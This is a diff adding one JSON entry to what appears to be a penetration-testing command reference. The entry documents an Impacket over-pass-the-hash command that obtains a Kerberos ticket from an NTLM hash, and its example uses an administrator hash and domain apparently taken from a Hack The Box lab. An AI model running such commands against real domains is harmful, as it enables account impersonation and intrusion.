@@ -1,0 +1,23 @@
+{
+  "id": "gettgt-kerberoast-hash",
+  "name": "Impacket Over-Pass-The-Hash",
+  "command": "impacket-getTGT -hashes ':<hash>' <domain>/<user> -dc-ip <ip>",
+  "description": "Get TGT ticket using the hash",
+  "platform": "linux",
+  "requires": [
+    "hash"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "opth",
+    "tgt",
+    "hash",
+    "kerberos"
+  ],
+  "examples": [
+    "impacket-getTGT -hashes ':e656e07c56d831611b577b160b259ad2' voleur.htb/administrator -dc-ip 10.10.11.76"
+  ]
+}
